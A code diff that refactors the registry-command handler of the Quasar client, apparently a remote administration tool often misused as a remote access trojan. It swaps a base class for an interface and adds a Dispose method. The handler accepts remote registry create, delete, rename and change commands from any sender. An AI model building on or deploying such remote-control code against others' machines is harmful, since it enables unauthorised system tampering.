@@ -1,6 +1,5 @@
 ﻿using Quasar.Client.Extensions;
 using Quasar.Client.Helper;
-using Quasar.Client.Networking;
 using Quasar.Client.Registry;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
@@ -9,16 +8,9 @@ using System;
 
 namespace Quasar.Client.Messages
 {
-    public class RegistryHandler : MessageProcessorBase<object>
+    public class RegistryHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
-
-        public RegistryHandler(QuasarClient client) : base(false)
-        {
-            _client = client;
-        }
-
-        public override bool CanExecute(IMessage message) => message is DoLoadRegistryKey ||
+        public bool CanExecute(IMessage message) => message is DoLoadRegistryKey ||
                                                              message is DoCreateRegistryKey ||
                                                              message is DoDeleteRegistryKey ||
                                                              message is DoRenameRegistryKey ||
@@ -27,9 +19,9 @@ namespace Quasar.Client.Messages
                                                              message is DoRenameRegistryValue ||
                                                              message is DoChangeRegistryValue;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -233,9 +225,18 @@ namespace Quasar.Client.Messages
             client.Send(responsePacket);
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
         {
-            
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+
         }
     }
 }
